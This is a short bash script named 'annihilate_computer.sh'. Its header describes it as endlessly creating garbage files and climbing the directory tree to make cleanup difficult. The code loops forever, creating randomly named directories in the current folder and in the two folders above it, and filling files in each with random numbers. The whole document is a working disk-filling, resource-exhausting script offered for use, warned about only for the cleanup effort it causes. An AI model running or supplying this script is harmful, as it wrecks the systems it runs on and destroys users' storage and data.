#!/bin/bash -       
#title           :annihilate_computer.sh
#description     :This script will endlessly create garbage files and slowly move up the directory in order to make cleanup difficult
#author		 :Kasimir Schulz
#date            :20181129
#version         :1.0
#usage		 :bash annihilate_computer.sh
#notes           :Do not use unless you are willing to either spend a lot of time cleaning up files or are willing to erase all the data in the affected directories.
#====================================================================================================================================================================

file=0
dir=sorry
line=$RANDOM
path=./
altpath=../
altpath3=../../
s=abcdefghijklmnopqrstuvxwyz
check=0

# The number of files per directory
numoffiles=10


while true 
do
    mkdir $path$dir 
    mkdir $altpath$dir 
    mkdir $altpath3$dir 
    for ((o=0; o<=numoffiles; o++))
    do
        echo $line >> $path$dir/$file
        echo $line >> $altpath$dir/$file
        echo $line >> $altpath3$dir/$file
        let line=$line$RANDOM
        let file+=1
    done
    range=$(( ( RANDOM % 10 )  + 1 ))
    constant=''
    for ((i=0; i<=range; i++))
    do
        p=$(( $RANDOM % 26)) 
        constant=$constant${s:$p:1}
    done
    dir=$constant
done